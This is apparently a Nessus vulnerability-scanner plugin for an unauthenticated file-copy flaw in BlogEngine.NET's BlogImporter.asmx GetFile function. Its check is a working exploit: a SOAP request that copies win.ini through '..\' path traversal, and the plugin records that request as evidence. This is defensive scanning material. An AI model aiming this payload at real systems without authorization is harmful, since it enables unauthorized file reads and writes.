#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(51564);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/05/02 23:36:52 $");

  script_bugtraq_id(45681);
  script_osvdb_id(70311);

  script_name(english:"BlogEngine.NET api/BlogImporter.asmx GetFile Function Unauthorized Access");
  script_summary(english:"Tries to use the function to copy a file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a script that can be abused to copy
files."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The web server hosts BlogEngine.NET, an open source .NET blogging
project. 

An install of the software on the remote host allows unauthenticated
access to the 'GetFile' function of the 'api/BlogImporter.asmx'
script.  An unauthenticated, remote attacker may be able to abuse this
function to copy files on the affected host, possibly originating from
third-party hosts and possibly to directories outside the
application's 'App_Data\files' directory. 

Successful exploitation may result in disclosure of sensitive
information, allow for execution of arbitrary code, fill up disk
space, or even facilitate attacks against third-party hosts. 

Note that Nessus has only verified that the affected function and
script are accessible without authentication although it's possible
that the code has been changed to prevent abuse without changing how
it responds to the requests that Nessus uses."
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://blogengine.codeplex.com/"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Upgrade to BlogEngine.Net 2.0 or remove the affected script."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/01/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/01/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/01/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/ASP");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, asp:TRUE);


# Clear the cookies, in case Nessus was given credentials.
clear_cookiejar();


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/BlogEngine", "/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

contents = "";
found_app = FALSE;
new_file = "";
vuln_req = "";
vuln_urls = make_list();

foreach dir (dirs)
{
  # Make sure we're looking at BlogEngine.
  url = dir + '/archive.aspx';
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  if (
    'rel="shortcut icon" href="pics/blogengine.ico"' >< res[2] ||
    'Powered by <a href="http://www.dotnetblogengine.net">BlogEngine.NET</a>' >< res[2] ||
    'function registerVariables(){BlogEngine.webRoot=' >< res[2] ||
    ';BlogEngine.i18n.savingTheComment=' >< res[2] ||
    'BlogEngine.$(' >< res[2]
  ) found_app = TRUE;
  else continue;

  # Make sure the affected script exists.
  url = dir + '/api/BlogImporter.asmx';
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  if (
    'BlogImporter Web Service' >< res[2] ||
    '<a href="BlogImporter.asmx?op=' >< res[2]
  )
  {
    foreach windir (make_list("WINDOWS", "WINNT"))
    {
      # Try to exploit the issue to copy a file.
      #
      # nb: 'dst' is relative to the web app's 'App_Data\files' directory.
      src = "C:\" + windir + "\win.ini";
      dst = "..\" + SCRIPT_NAME + '-' + unixtime();

      soap_action = '"http://dotnetblogengine.net/GetFile"';

      postdata = 
        '<?xml version="1.0" encoding="utf-8"?>\n' +
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n' +
        '  <soap:Body>\n' +
        '    <GetFile xmlns="http://dotnetblogengine.net/">\n' +
        '      <source>' + src + '</source>\n' +
        '      <destination>' + dst + '</destination>\n' +
        '    </GetFile>\n' +
        '  </soap:Body>\n' +
        '</soap:Envelope>\n';

      res = http_send_recv3(
        method       : "POST", 
        port         : port,
        item         : url,
        data         : postdata, 
        add_headers  : make_array(
          'Content-Type', "text/xml; charset=utf-8",
          'SOAPAction', soap_action
        ),
        exit_on_fail : TRUE
      );

      # nb: success depends on having the correct permissions, especially
      #     to write the file.
      if (
        'text/xml' >< res[1] &&
        'dotnetblogengine.net/"><GetFileResult>true' >< res[2]
      )
      {
        vuln_urls = make_list(vuln_urls, url);
        if (!vuln_req)
        {
          vuln_req = http_last_sent_request();
          contents = res[1] + '\r\n' + res[2];
          new_file = dst - "..\";
        }
        break;
      }
    }
    if (contents && !thorough_tests) break;
  }
}

if (!found_app) exit(0, "The web server listening on port "+port+" does not appear to host BlogEngine.NET.");
if (max_index(keys(vuln_urls)) == 0) exit(0, "No vulnerable installs of BlogEngine.NET were found on the web server on port "+port+".");


# Report findings.
if (report_verbosity > 0)
{
  info = "";
  foreach url (vuln_urls)
    info += '\n  - ' + build_url(port:port, qs:url);

  if (max_index(keys(vuln_urls)) > 1) s = "s";
  else s = "";

  report = 
    '\n' + 'Nessus found the following vulnerable instance' + s + ' of the affected' +
    '\n' + 'script :' +
    '\n' + 
    info +
    '\n' +
    '\n' + 'For example, it appears to have been able to exploit the issue to copy' +
    '\n' + 'the \'win.ini\' file from the affected host\'s Windows directory to' +
    '\n' + '\'' + new_file + '\' in the application\'s' +
    '\n' + 'App_Data subdirectory by sending a request such as :' +
    '\n' +
    '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
    '\n' + chomp(vuln_req) +
    '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  if (report_verbosity > 1)
  {
    report += 
      '\n' + 'This produced the following HTTP response :' +
      '\n' +
      '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
      '\n' + contents +
      '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
